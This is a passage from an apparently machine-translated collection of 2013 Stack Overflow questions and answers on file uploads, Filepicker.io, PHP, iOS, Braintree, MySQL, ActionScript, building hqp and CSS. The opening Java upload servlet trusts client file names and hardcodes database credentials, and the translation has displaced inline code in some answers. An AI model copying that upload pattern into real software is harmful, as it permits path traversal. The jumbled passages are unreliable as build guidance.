res.setContentType("text/html");
PrintWriter pw=res.getWriter();

try
{
//step1
DiskFileItemFactory df=new DiskFileItemFactory();
//step2
df.setSizeThreshold(10000); //setting buffersize    
String temp=getServletContext().getRealPath("/WEB-INF/temp");
df.setRepository(new File(temp)); //if buffer crossed comes into the temp
//step3
ServletFileUpload sf=new ServletFileUpload(df);
//step4
List<FileItem> items=(List<FileItem>)sf.parseRequest(req);
//step5
for(FileItem item: items)
{
if(item.isFormField())
{
//this item is a simple text field
String name=item.getFieldName();
String value=item.getString();
pw.println(name+"="+value+"<br/>");
}
else
{
//this is a file
String name=item.getFieldName();
String fileName=item.getName();

if(fileName.lastIndexOf('\\')!=-1)
fileName=fileName.substring(fileName.lastIndexOf('\\')+1);

fileName=getServletContext().getRealPath("/WEB-INF/upload/"+fileName);
item.write(new File(fileName));
pw.println("file:"+fileName+"saved</br>");
      BlobDemo.saveFile(fileName);

}//else
}//for

}catch(Exception e){e.printStackTrace(); }
    }
    } 
```

此代码将客户端的文件放入WEB_INF/upload文件夹，文件上传后使用相同的路径定位文件，并使用流和blob数据类型存储文件及其文件名。

```
public class BlobDemo {
private static String url = "jdbc:oracle:thin:@localhost:1521:xe";
private static String username = "kodejava";
private static String password = "welcome";

public static void saveFile(String fileName)throws Exception {
    Connection conn = null;
    FileInputStream fis = null;
    try {
        Class.forName("oracle.jdbc.driver.OracleDriver");
        conn = DriverManager.getConnection(url, username, password);
        conn.setAutoCommit(false);

        String sql = "INSERT INTO Files_Table(name,  file) VALUES (?, ?)";
        PreparedStatement stmt = conn.prepareStatement(sql);
        stmt.setString(1, fileName);

        File file = new File("WEB-INF\\upload\\"+fileName);
        fis = new FileInputStream(file);
        stmt.setBinaryStream(2, fis, (int) file.length());
        stmt.execute();

        conn.commit();
    } catch (SQLException e) {
        e.printStackTrace();
    } finally {
        if (fis != null) {
            fis.close();
        }
        if (conn != null && !conn.isClosed()) {
            conn.close();
        }
    }
} 
```

}

# filepicker.io - Filepicker.io — 停止 .pickMultiple 自动将文件存储在 S3 存储桶中

> ID：15650436
> 
> 赞同：1
> 
> 时间：2013-03-27T01:25:05.900
> 
> 标签：filepicker.io

我正在尝试使用 Filepicker.io 作为上传器，但为了为有效负载中的每个文件触发 onSuccess 事件，我使用了 .pickMultiple 和 .store 方法的组合。像这样：

```
 filepicker.pickMultiple(function(fpfiles){

        for(var i = 0; i < fpfiles.length; i++){

            //Clean the filename

            //Check duplicate

            //Store the file on S3
            filepicker.store(
               fpfiles[i].url,
               {location: 'S3', path: 'filepicker/' + fpfiles[i].filename},
               function(my_uploaded_file){
                  //Do some other cool stuff ...
               }
            );
        }               
    }); 
```

（这与使用 .pickAndStore 方法相反，该方法只会在整个有效负载完成传输后触发 onSuccess 事件）

我遇到的问题是，似乎认为 .pickMultiple 方法是“自动”将文件的副本保存在我的 S3 存储桶的根目录中；所以我最终得到了同一个文件的两个副本。

例如：

如果我将 my_file.png 上传到存储桶中名为 IMAGES 的文件夹，我应该得到[http://s3.amazonaws.com/my_bucket/IMAGES/my_file.png的结果](http://s3.amazonaws.com/my_bucket/IMAGES/my_file.png)

这*正在*发生，但我也得到了： [http ://s3.amazonaws.com/my_bucket/UNIQUE_ID_my_file.png](http://s3.amazonaws.com/my_bucket/UNIQUE_ID_my_file.png)

任何人都知道如何防止 .pickMultiple 自动将文件添加到我的 S3 存储桶中？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-29T02:17:04.643

对于可能遇到同样问题的其他任何人，.pickMultiple() —> .store() 方法是死路一条。*为有效负载中的每个*文件触发 onSuccess 事件的（唯一）方法是使用 vanilla `<input type="file" />`onChange 事件来获取元素的 FILES 数组，然后遍历 FILES 并为数组中的每个文件调用 .store() .

**这个例子：**

```
$('#BTN_upload').change(function(){

    var files = $(this)[0].files;

    //So you can see what should be uploading
    console.log(JSON.stringify(files));

    //Loop the files array to store each file on S3
    for(var i = 0; i < files.length; i++){

        //All good. Now execute the .store call
        filepicker.store(

            //The file to upload
            files[i],

            //The file options
            //(I'm storing the files in a specific folder within my S3 bucket called 'my_folder')
            //This is also where you'll rename your file to whatever you'd like
            {path: 'my_folder/' + files[i].name},

            //OnSuccess
            function(FPFile){
                console.log("Store successful: ", JSON.stringify(FPFile));
                //Now possibly call .remove() to remove the 'temp' file from FP.io
            },

            //OnError
            function(FPError){
                console.log(FPError.toString());
            },

            //OnProgress
            function(progress){
                console.log("Loading: " + progress + "%");
            }
       );

    }

});
filepicker.setKey('MY_FP.IO_KEY'); 
```

**和 HTML：**

```
<input id="BTN_upload" type="file" /> 
```

这个例子不是一个成品。您仍然需要滚动您自己的用户反馈（例如带有进度条的队列显示）、重复检查、重命名等。但这都是非常简单的事情。

**注意：这仅适用于本地到 S3 的上传。我不确定如何整合 FP.io 的其他资源。也许你会？**

# php - 修改动态填充选择元素以使用数据库中的数组的函数

> ID：15650439
> 
> 赞同：1
> 
> 时间：2013-03-27T01:25:16.660
> 
> 标签：php, arrays, html-select, populate

我正在尝试修改我一直用来动态填充`<select>`元素以使用数据库中的数组的函数。原始函数使用硬编码数组来填充元素，并预先选择与 db 值匹配的选项。

修改后的函数创建了元素，但它只添加了数据库中的第一个值。我怎样才能修改它，以便它循环遍历所有应该添加到`<select>`元素的值？

*PHP 函数和查询*

```
<?php
function printSelectOptions($dataArray, $currentSelection) {
    foreach ($dataArray as $key => $value) {
        echo '<option ' . (($key == $currentSelection)) . ' value="' . $key . '">' . $value . '</option>';
    }
}
try {  
    $stmt = $conn->prepare("SELECT * FROM student");  
    $stmt->execute();
    }catch(PDOException $e) {
    echo $e->getMessage();
} 
$row = $stmt->fetch();
?> 
```

*填充选择元素*

```
<select name="fname">
    <?php
        echo printSelectOptions(array($row['fname'])); 
    ?>
</select> 
```

**填充元素的原始函数和代码**

```
function printSelectOptions($dataArray, $currentSelection) {
    foreach ($dataArray as $key => $value) {
        echo '<option ' . (($key == $currentSelection) ? 'selected="selected"' : '') . ' value="' . $key . '">' . $value . '</option>';
    }
}

<select name="fname">
    <?php
        $options = array("John"=>"John", "Mary"=>"Mary", "Elizabeth"=>"Elizabeth");
        $selected = $row['fname'];
        echo printSelectOptions($options, $selected); 
    ?>
</select> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:36:39.787

由于您只通过 获取了一行`fetch()`，因此只有一个值被传递到您的函数`printSelectOptions()`中。相反，通过获取所有行[`fetchAll()`](http://php.net/manual/en/pdostatement.fetchall.php) 并修改您的函数以接收完整数组，以及一个*字符串*，该字符串是您要从中打印的列名（数组键）。

```
// All rows into $rows...
$rows = $stmt->fetchAll();

// Make the function accept the full 2D array, and 
// a string key which is the field name to list out:
function printSelectOptions($dataArray, $currentSelection, $fieldname) {
    // String to hold output
    $output = '';
    foreach ($dataArray as $key => $value) {
        // Rather than echo here, accumulate each option into the $output string
        // Use the $fieldname as a key to $value which is now an array...
        $output .= '<option ' . (($key == $currentSelection)) . ' value="' . $key . '">' . htmlspecialchars($value[$fieldname], ENT_QUOTES) . '</option>';
    }
    return $output;
} 
```

然后调用函数为：

```
echo printSelectOptions($rows, $currentSelection, 'fname'); 
```

现在的方式是，选项的 value 属性由数组键填充，该键将从零开始编号。`id`这类似于您的原始数组版本，但指定另一个列名（如键列） 可能更有用。

```
// This one also takes a $valuename to use in place of $key...
function printSelectOptions($dataArray, $currentSelection, $valuename, $fieldname) {
    // String to hold output
    $output = '';
    foreach ($dataArray as $key => $value) {
        // Rather than echo here, accumulate each option into the $output string
        // Use the $fieldname as a key to $value which is now an array...
        $output .= '<option ' . (($value[$valuename] == $currentSelection)) . ' value="' . $value[$valuename] . '">' . htmlspecialchars($value[$fieldname], ENT_QUOTES) . '</option>';
    }
    return $output;
} 
```

并将被称为：

```
 echo printSelectOptions($rows, $currentSelection, 'id', 'fname'); 
```

# ios - 每次我的应用程序启动（无论是从冷启动还是后台启动）我都想让它做一些事情，我该如何完成呢？

> ID：15650440
> 
> 赞同：4
> 
> 时间：2013-03-27T01:25:17.827
> 
> 标签：ios, objective-c, ios5, ios6

我想在应用程序每次启动时检查剪贴板中是否有 URL，如果有，请对其进行处理。每当应用程序启动时，我可以覆盖哪个方法触发，无论是从冷启动（例如它在后台被杀死）还是我只是按下主页按钮，复制一个 URL 并跳回。

是其中之一吗？

```
 - (void)applicationDidBecomeActive:(UIApplication *)application
 - (void)applicationWillEnterForeground:(UIApplication *)application
 - (void)applicationDidBecomeActive
 - (void)applicationDidFinishLaunching:(UIApplication *)application 
```

使困惑。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-06-09T04:06:05.020

正如@rmaddy 所说，应用程序启动后使用的正确方法`applicationWillEnterForeground:`来自您的应用程序委托。这个方法会在用户跳转回来的时候被调用，但是在你不需要响应的其他情况下（比如用户收到一条短信并关闭它）不会被调用。

但是，根据我的测试，从冷启动应用程序时`applicationWillEnterForeground:`不会*调用；*你应该抓住它`applicationDidFinishLaunchingWithOptions:`。

因此，基本上，您的应用程序委托应包含如下代码：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {

    [self checkForURL];
    ...
}

- (void)applicationWillEnterForeground:(UIApplication *)application {

       [self checkForURL];
       ...
}

- (void)checkForURL{
    //code for checking for URL goes here
} 
```

希望有帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:31:06.743

`- (void)applicationDidBecomeActive`当应用程序启动或从后台变为活动状态时调用。

该文档很好地解释了一切：http: [//developer.apple.com/library/ios/#documentation/iphone/conceptual/iphoneosprogrammingguide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html](http://developer.apple.com/library/ios/#documentation/iphone/conceptual/iphoneosprogrammingguide/ManagingYourApplicationsFlow/ManagingYourApplicationsFlow.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-09T04:29:21.863

在您的应用程序委托中，将其添加到其他答案建议的方法中（applicationDidFinishLaunchingWithOptions:)。在您的根视图控制器中注册以下通知。一旦您的应用程序已经开始运行，它将始终在启动时调用。

```
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(bringingItBack)      name:UIApplicationWillEnterForegroundNotification object:nil]; 
```

这将涵盖应用程序启动时的实例以及您刚刚将其从后台恢复时的实例。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T01:35:19.933

参考[UIApplicationDelegate](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIApplicationDelegate_Protocol/Reference/Reference.html)协议，应用启动的处理可以通过 2 种方法来处理：

*   `application:willFinishLaunchingWithOptions:`
*   `application:didFinishLaunchingWithOptions:`

并且可以借助以下方法处理从后台启动应用程序： `applicationDidBecomeActive:`

基于上述调用，您可以处理您的应用程序。

# ios - JSON 推文发布日期

> ID：15650444
> 
> 赞同：0
> 
> 时间：2013-03-27T01:25:44.003
> 
> 标签：ios, json, twitter

我的 iOS 应用程序中有一个 twitter 提要。我有以下信息：用户名和用户的帖子，但我想知道是否以及如何获取帖子的时间戳我在 JSON 中查找什么。我只想要它发布的日期。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T03:08:17.620

[NSString stringWithFormat:@"Date: %@",[tweet objectForKey:@"created_at"]];

# c# - Braintree API 在 Sandbox 中的 CreateCard.Create 上抛出 Braintree.Exceptions.AuthorizationException

> ID：15650445
> 
> 赞同：5
> 
> 时间：2013-03-27T01:25:47.990
> 
> 标签：c#, .net, braintree

我正在使用 ASP.NET MVC 4、.NET Braintree Payments API 和 Braintree.js。

这是我为 Braintree 构建的一个简单包装器：

```
public class PaymentBL
{
    private static BraintreeGateway _braintreeGateway = new BraintreeGateway
        {
            Environment = Braintree.Environment.SANDBOX,
            MerchantId = "xxxxxxx",
            PublicKey = "xxxxxxxxxxxx",
            PrivateKey = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        };

    public Result<Transaction> ChargeCardOnce(decimal amount, string cardholderName, string cardNumber, string expiration,
        string cvv)
    {
        TransactionCreditCardRequest creditCardRequest = new TransactionCreditCardRequest();
        creditCardRequest.CardholderName = cardholderName;
        creditCardRequest.Number = cardNumber;
        creditCardRequest.ExpirationDate = expiration;
        creditCardRequest.CVV = cvv;

        TransactionOptionsRequest optionsRequest = new TransactionOptionsRequest();
        optionsRequest.SubmitForSettlement = true;

        TransactionRequest transactionRequest = new TransactionRequest();
        transactionRequest.Amount = amount;
        transactionRequest.CreditCard = creditCardRequest;
        transactionRequest.Options = optionsRequest;

        return _braintreeGateway.Transaction.Sale(transactionRequest);
    }

    /// <summary>
    /// Stores a credit card in the Braintree vault.  In some cases, will put a $1 temporary charge
    /// on the credit card that will come off a few days later.
    /// 
    /// From BrainTree: Regardless of card type, any instance where a $1 authorization returns a successful result, 
    /// we immediately follow-up with an automatic void request to ensure that the transaction will fall off 
    /// of the cardholder's statement as soon as possible.
    /// </summary>
    public Result<CreditCard> StoreCustomer(int customerId, string cardholderName, string cardNumber, string expiration, string cvv)
    {
        //CreditCardAddressRequest addressRequest = new CreditCardAddressRequest();
        //addressRequest.PostalCode = postalCode;

        CreditCardOptionsRequest optionsRequest = new CreditCardOptionsRequest();
        optionsRequest.VerifyCard = true;
        optionsRequest.VerificationMerchantAccountId = _braintreeGateway.MerchantId;

        CreditCardRequest creditCard = new CreditCardRequest();
        creditCard.CustomerId = customerId.ToString();
        creditCard.Token = customerId.ToString();   // Use same token to ensure overwrite
        creditCard.CardholderName = cardholderName;
        creditCard.Number = cardNumber;
        creditCard.ExpirationDate = expiration;
        creditCard.CVV = cvv;
        creditCard.Options = optionsRequest;

        return _braintreeGateway.CreditCard.Create(creditCard);
    }

    /// <summary>
    /// Search BrainTree vault to retrieve credit card
    /// </summary>
    /// <param name="customerId"></param>
    public CreditCard GetCreditCardOnFile(int customerId)
    {
        Customer customer = null;

        try
        {
            customer = _braintreeGateway.Customer.Find(customerId.ToString());
        }
        catch (Braintree.Exceptions.NotFoundException)
        {
            return null;
        }

        if (customer.CreditCards == null || customer.CreditCards.Length == 0)
        {
            return null;
        }

        if (customer.CreditCards.Length >= 2)
        {
            throw new Exception(string.Format("Customer {0} has {1} credit cards",
                customerId, customer.CreditCards.Length));
        }

        return customer.CreditCards[0];
    }
} 
```

当我调用此方法时，它可以工作：

```
 Result<Transaction> result = paymentBL.ChargeCardOnce(
                2.34m
                , formCollection["name"]
                , formCollection["number"]
                , formCollection["exp"]
                , formCollection["cvv"]
            ); 
```

随后，我可以在 Braintree 仪表板中查看已完成的测试事务。因此，我知道来自 Braintree.js 的加密表单值正确地到达了我的控制器操作，并且我的密钥和商家帐户 ID 都已正确设置。

当我将上述对 ChargeCardOnce 的调用替换为对 StoreCustomer 的以下调用时，我在该行收到 Braintree.Exceptions.AuthorizationException`return _braintreeGateway.CreditCard.Create(creditCard);`

```
 Result<CreditCard> result = paymentBL.StoreCustomer(
                systemHost.Customer.CustomerId
                , formCollection["name"]
                , formCollection["number"]
                , formCollection["exp"]
                , formCollection["cvv"]
            ); 
```

来自 Braintree 支持：“您可以在沙盒中创建客户和信用卡，因为它的构建完全反映了生产环境的样子。”

有没有人也经历过这个？我指的是 Braintree 对这个问题的支持，但如果 SO 上的任何人都看到了这一点并且知道解决方案或解决方法，我会松一口气。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-28T01:15:12.953

[我在布伦特里工作。看起来我们已经回复了您的问题的答案，但我也会在这里为将来遇到相同问题的任何人回答。]

在这种情况下，问题是：

```
optionsRequest.VerificationMerchantAccountId = _braintreeGateway.MerchantId; 
```

您的商家 ID 标识您的支付网关帐户，而您的商家帐户 ID 标识您要用于验证的银行帐户。[我们支持中心的一篇文章解释了不同之处](https://support.braintreepayments.com/customer/portal/articles/1080468)：

> **`MerchantAccountId`**
> 
> 使用 Braintree，您可以拥有多个商家帐户，所有这些帐户都通过同一个网关帐户进行处理。这意味着您可以在一个帐户下设置和处理多个位置、多个业务、多种货币等。这使您可以通过统一的报告和访问轻松跟踪您的所有处理，甚至可以为您节省资金。
> 
> 您可以按照以下步骤在您的网关账户中找到所有商家账户的 ID：
> 
> *   登录到您的帐户
>     
>     
> *   将鼠标悬停在您的帐户名称上，然后单击“处理中”
>     
>     
> *   滚动到页面底部到标有“商家帐户”的部分。

An`AuthorizationException`是[HTTP 状态码 403 Forbidden](http://en.wikipedia.org/wiki/HTTP_403)。这意味着服务器正在拒绝您的请求，因为您无权访问资源（即使您可能已通过身份验证）。

由于您指定的 ID 没有可供您的用户使用的商家帐户（因为它根本不是商家帐户 ID），因此您将获得`AuthorizationException`.

如果您的商家通常只有一个商家账户，或者您想使用默认账户，则无需指定`VerificationMerchantAccountId`.

# mysql - 为什么我会收到“#1066 - Not unique table/alias”？

> ID：15650446
> 
> 赞同：0
> 
> 时间：2013-03-27T01:25:50.197
> 
> 标签：mysql

我不断得到：

> #1066 - 不是唯一的表/别名：'user_account'

对于以下。我已阅读所有答案，我相信应该没问题。有什么问题？

```
SELECT user_session.node_id, user_account.login_name
FROM user_session, user_account 
LEFT JOIN user_account ON user_account.id=user_session.user_id 
WHERE user_account.login_name="mike@rocketmail.com" OR user_account.login_name="mikeg@looxcicon.com" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T01:29:51.347

您正在对`user_account`表进行两次查询。这应该有效：

```
SELECT user_session.node_id, user_account.login_name 
FROM user_session
    LEFT JOIN user_account ON user_account.id=user_session.user_id 
WHERE user_account.login_name="mike@rocketmail.com" 
    OR user_account.login_name="mikeg@looxcicon.com" 
```

您的查询有：

```
FROM user_session, user_account 
    LEFT JOIN user_account 
```

您可以多次查询同一个表，但您需要添加一个别名。我不认为那是你的意图。

顺便说一句 - 因为您`WHERE`在 user_account 表上有条件，所以不需要`LEFT JOIN`. 我会用一个`INNER JOIN`代替。

# actionscript-3 - 需要向一个方向移动这个对象

> ID：15650449
> 
> 赞同：0
> 
> 时间：2013-03-27T01:26:33.953
> 
> 标签：actionscript-3

我试图在水平面上移动这个安全带对象。我已经发布了我到目前为止所做的事情。它并没有真正奏效，因为似乎一旦我按下按钮，安全带只能向右侧移动并且`MOUSE_UP`不起作用。有人可以指导我如何去做吗？

```
 seatBelt.addEventListener (MouseEvent.MOUSE_DOWN, prsing);
    seatBelt.addEventListener (MouseEvent.MOUSE_UP, lfting);
    seatBelt.addEventListener (MouseEvent.MOUSE_MOVE, mving);

    function prsing (e:MouseEvent){
    posX= seatBelt.x ;
        posY = seatBelt.y ;
        mouseclick = 1;

    }
    function mving (e:MouseEvent) {
        if (mouseclick == 1) {
        seatBelt.x = mouseX ;
        }
    }

    function lfting (e:MouseEvent){
        seatBelt.x = posX;
        seatBelt.y = posY;
        mouseclick =0;

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-27T01:44:39.507

因此，您的预期功能是能够沿 x 轴拖动安全带并在释放时让它回到原来的位置？

您需要更改 MOUSE_UP 和 MOUSE_MOVE 来听舞台而不是安全带。这是因为当按钮不再位于安全带上方时，您可以释放按钮，因此该函数永远不会被调用。然而，舞台将接收该事件。

```
stage.addEventListener(MouseEvent.MOUSE_UP, lifting);
stage.addEventListener(MouseEvent.MOUSE_MOVE, moving); 
```

我不确定您在哪里声明`mouseX`变量，但如果您在拖动功能后将侦听器更改为：

```
 function moving (e:MouseEvent) {
        if (mouseclick == 1) {
        seatBelt.x = e.stageX;
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T01:49:30.780

你所拥有的大部分看起来还不错，除了我认为正在发生的事情是你在舞台上/在安全带对象之外的某个地方“鼠标移动”。我猜这是为了让物体移动你让它对鼠标移动做出反应......我猜你正在将鼠标移动到整个舞台并离开安全带物体，此时你释放鼠标。

要检查是否是这种情况，请尝试在您的安全带对象上释放鼠标，以查看您的 MOUSE_UP 事件是否被触发。

我猜你想要的行为是你想让对象在任何时候停止移动，无论鼠标在哪里释放。为此，请尝试将 MOUSE_UP 事件侦听器添加到舞台：

```
this.stage.addEventListener (MouseEvent.MOUSE_UP, lfting); 
```

但是，由于您可能并不总是希望此侦听器处于活动状态，因此可能仅在鼠标在对象上按下时添加它，方法是仅根据需要添加和删除侦听器。

我已经对您的代码进行了一些编辑以显示我的意思并取出“mouseclick”布尔值，因为它不再需要跟踪鼠标按下/向上事件：

```
seatBelt.addEventListener(MouseEvent.MOUSE_DOWN, prsing);

function prsing(e:MouseEvent){
    posX= seatBelt.x ;
    posY = seatBelt.y ;
    this.stage.addEventListener(MouseEvent.MOUSE_MOVE, mving);
    this.stage.addEventListener(MouseEvent.MOUSE_UP, lfting);
}

function mving(e:MouseEvent) {
    seatBelt.x = mouseX;
}

function lfting(e:MouseEvent){
    seatBelt.x = posX;
    seatBelt.y = posY;
    this.stage.removeEventListener(MouseEvent.MOUSE_MOVE, mving);
    this.stage.removeEventListener(MouseEvent.MOUSE_UP, lfting);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:51:08.773

您可以使用 Sprite.startDrag 方法来做您需要的事情。不需要 MOUSE_MOVE 侦听器。如果需要，请查找参数：[Sprite。](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/display/Sprite.html) 我喜欢一次只有一个 MOUSE_DOWN 或 MOUSE_UP 侦听器处于活动状态。

```
seatBelt.addEventListener (MouseEvent.MOUSE_DOWN, prsing);

function prsing (e:MouseEvent){
    seatBelt.startDrag(false, new Rectangle(0,seatBelt.y,stage.width,seatBelt.y));
    seatBelt.removeEventListener (MouseEvent.MOUSE_DOWN, prsing);
    seatBelt.addEventListener (MouseEvent.MOUSE_UP, lfting);
}

function lfting (e:MouseEvent){
    seatBelt.stopDrag();
    seatBelt.addEventListener (MouseEvent.MOUSE_DOWN, prsing);
    seatBelt.removeEventListener (MouseEvent.MOUSE_UP, lfting);
} 
```

# macos - 出错：在 OS X 上安装 hqp（巨大的二次规划）

> ID：15650453
> 
> 赞同：0
> 
> 时间：2013-03-27T01:27:08.350
> 
> 标签：macos, gcc, makefile, quadratic

我正在尝试在 OS X 上安装[hqp](http://hqp.sourceforge.net/installation.html)，但`gcc`编译器似乎完全不同。运行时`make`，我首先遇到一个错误`malloc.h not found`，我将标头包装为`#include`：

```
#if !defined(__APPLE__)
#include <malloc.h>
#endif 
```

这样，第一个问题就解决了。但是当我继续运行时`make`，我得到了类似的东西：

```
g++ -shared -o libhqp.so Hqp_Init.o Hqp.o sprcm.o Meschach.o spBKP.o matBKP.o bdBKP.o Hqp_impl.o Hqp_Program.o Hqp_Solver.o Hqp_Client.o Hqp_IpsFranke.o Hqp_IpsMehrotra.o Hqp_IpMatrix.o Hqp_IpSpBKP.o Hqp_IpRedSpBKP.o Hqp_IpLQDOCP.o t_mesch.o Hqp_IpSpSC.o meschext_hl.o Hqp_SqpSolver.o Hqp_SqpPowell.o Hqp_SqpSchittkowski.o Hqp_HL.o Hqp_HL_Gerschgorin.o Hqp_HL_DScale.o Hqp_HL_BFGS.o Hqp_HL_SparseBFGS.o Hqp_SqpProgram.o Hqp_Docp.o hqp_solve.o \
          ../meschach/*.o ../iftcl/*.o -L"/sw/lib" -Wl,-rpath,"/sw/lib" -ltclstub8.5
i686-apple-darwin11-llvm-g++-4.2: ../meschach/*.o: No such file or directory
i686-apple-darwin11-llvm-g++-4.2: ../iftcl/*.o: No such file or directory 
```

有谁知道这次有什么不同的组件？我尝试重新安装最新版本的tcl，但似乎不是问题。发现很难用谷歌搜索解决方案......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-27T16:39:50.347

在没有实际测试结果的情况下，我使用以下步骤使其工作。我不得不说，这组 makefile 不能正常工作，尤其是在如何设置依赖项方面。

首先，编辑`meschach/machine.h`并删除，或者像使用ifdef`#include <malloc.h>`一样使其有条件。`__APPLE__`包括在内的唯一原因`malloc.h`似乎是为了`malloc()`和`free()`那些`stdlib.h`无论如何都被包括在内的原因。

然后编辑`makedirs.in`并附`-I/usr/include/malloc`加到`MES_INCDIR`，留下`MES_INCDIR = -I.. -I/usr/include/malloc`.

完成这两个步骤后，do`./configure`后面的操作`make`应该已经`libhqp.so`在`lib`目录中为您提供了，这对您来说可能就足够了。

但是，在该过程中执行`docp`的目录中还调用了一个可执行文件。它不起作用，因为它找不到共享库。我通过-ing 进入目录和设置解决了这个问题。不过，我不确定跑步是否是该过程的重要组成部分。`hqp_docp``make``libhqp.so``cd``lib``export DYLD_FALLBACK_LIBRARY_PATH=$PWD``docp`

`omu`最后，由于链接器没有传递对所需库的任何引用，因此构建了一个称为中断的库`libhqp.so`。我不知道为什么这会在其他系统上工作，我不知道你是否需要它`libomu`。我只是通过`-L../lib -lhqp`在链接器命令的末尾添加`omu/Makefile`. 那就是以 . 开头的命令`$(LD)`。

我希望我没有忘记我所采取的任何步骤，让我知道它是否仍然在某个地方对你不利。

# html - 破碎的 CSS - 带有角落图像的框

> ID：15650455
> 
> 赞同：1
> 
> 时间：2013-03-27T01:27:18.577
> 
> 标签：html, css

编辑：

使用了 Tim 的代码，它成功了！！！我唯一的问题是如何使我的标题独立于身体的其余部分并像模板图像一样在屏幕上伸展而没有任何顶部和侧面的填充？

这是设计模板： [设计模板](http://img707.imageshack.us/img707/6734/templatel.gif)

这是一个更新的代码html + css：

```
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
            <html xmlns="http://www.w3.org/1999/xhtml">
            <head>
            <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
            <title>Rounded Corner Tutorial</title>
            <style type="text/css">
            body{padding: 10px; background-color: #e8e8e8; font-family: Arial, Helvetica, sans-serif; font-size:12px;}
            h1{padding: 0px; margin: 0px;}

            #container{

                    margin:0px auto;
                    border:0px solid #bbb;
                    padding:0px;
                    }
            .white-box{width: 180px; margin: 0px;}

            #main-header {
                border:1px solid #bbb;
                height:80px;
                padding:10px;
                background:#FFF
            }

            #main-content {
                margin-top:10px;
                padding-bottom:10px;
            }

            #main-body {
                margin-left:10px;
                width:666px;
                height:150px;
            }

            #main-footer {

                margin-top:10px;
                margin-bottom:10px;
            padding:10px;
            border:1px solid #bbb;

            }   

            .box {
                padding: 8px;
                border: 1px solid silver;
                -moz-border-radius: 8px;
                -o-border-radius: 8px;
                -webkit-border-radius: 5px;
                border-radius: 8px;
                background-color: #fff;
            }

            .box1 {
                width: 200px;
                float: left;
            }

            .box2 {
                margin-left: 224px; 
            }

            </style>
            </head>
            <body>

            <div id="container">

            <div id="main-header">Main Header</div>
                <div id="main-content">

                    <div class="box box1">
                    left
                    </div>

                    <div class="box box2">
                    <p>Main Bbody 1...</p>
                    </div>

                </div>

                <div id="main-footer">Main Footer</div>
            </div>

            </body>
            </html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-27T01:34:21.277

使用`border-radius`和丢弃图像。它会让你的生活更轻松，并且在高像素密度的显示器上看起来很清晰（不像 GIF）。

*   演示：http: [//jsfiddle.net/QXqzd/1/](http://jsfiddle.net/QXqzd/1/)
*   浏览器支持：[http ://caniuse.com/#feat=border-radius](http://caniuse.com/#feat=border-radius)
*   更多示例： http: [//muddledramblings.com/table-of-css3-border-radius-compliance/](http://muddledramblings.com/table-of-css3-border-radius-compliance/)

**重要部分**

```
.box {
    padding: 8px;
    border: 1px solid silver;
    -moz-border-radius: 8px; /* older versions of FF */
    border-radius: 8px; /* IE9+, Webkit, etc. */
    background-color: #fff;
} 
```

**所有 CSS**

我创建了一个粗略的 CSS 样式表来匹配您的模板。

```
body { 
    background-color: #eee; 
}

.box {
    padding: 8px;
    border: 1px solid silver;
    -moz-border-radius: 8px;
    border-radius: 8px;
    background-color: #fff;
}

.box1 {
    width: 200px;
    float: left;
}

.box2 {
    margin-left: 224px;    
} 
```

**HTML**

```
<div class="box box1">
    left
</div>

<div class="box box2">
    right
</div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T02:41:42.963

我有一个建议代码，可能可以解决您的问题：

```
.your_css_rounded_column {
   border: 1px solid #cdcdcd;
    border-radius: 5px;
    -moz-border-radius: 5px;
    -o-border-radius: 5px;
    -webkit-border-radius: 5px;
    background-color: #fff;
} 
```

检查这个小提琴：http: [//jsfiddle.net/yYjrB/](http://jsfiddle.net/yYjrB/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-27T01:52:09.150

我 100% 同意蒂姆。我不确定现在是否需要使用 CSS3，但在过去，为了确保跨浏览器兼容性，除了边框半径之外，您还需要 Mozilla 和 Safari/iPhone 浏览器的额外代码：

```
.box {
    padding: 8px;
    border: 1px solid silver;
    border-radius: 8px;
    -moz-border-radius: 8px;
    -webkit-border-radius: 5px;
    background-color: #fff;
} 
```

无论哪种方式，为了安全起见，添加这两条额外的行都没有什么坏处。

# wordpress - 将论坛链接从 wordpress 帖子重定向到另一个页面，该页面有一个 iframe 指向实际论坛的模板

> ID：15650456
> 
> 赞同：0
> 
> 时间：2013-03-27T01:27:24.950
> 
> 标签：wordpress, redirect, iframe, mybb

好的，所以...我有一个 wordpress 帖子，其中有一个指向我的论坛的链接。

该论坛与 iframe 中的 wordpress 设计集成在一起。我想从文章页面转到论坛页面，并在论坛页面的 iframe（其中加载了论坛）中打开文章的链接。

论坛页面是 /forum/ 这就是 wordpress 显示它的方式，但实际上论坛托管在 /Forum/

我不希望人们在没有 http://website.com/Forum/ 设计的情况下直接进入论坛

我希望这能解释它。

假设我有一个带有侧边栏的 wordpress 帖子，在侧边栏中我有指向我最近的论坛主题的链接，例如一个 url：

http:// 网站。com/Forum/showthread.php?tid=4

